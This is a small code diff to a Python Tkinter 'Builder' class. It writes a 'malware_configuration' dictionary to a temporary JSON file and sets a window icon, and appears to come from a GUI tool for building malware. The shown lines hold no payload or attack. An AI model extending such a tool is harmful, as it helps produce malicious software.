@@ -117,6 +117,10 @@ class Builder:
             }
         }
 
+        if 'configuration.tmp' not in os.listdir('resources/assets'):
+            with open('resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
+                configuration_file.write(json.dumps(self.malware_configuration, indent=4))
+
         self.general_settings()
 
     def new_background(self, demand=None):
@@ -313,6 +317,7 @@ class Builder:
         cfg_editor.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width']) + 'x' + str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height']))
 
         cfg_editor.title('Configuration Editor')
+        cfg_editor.iconbitmap('resources/icons/default_icon.ico')
 
         frame = tk.Frame(cfg_editor)
         frame.place(
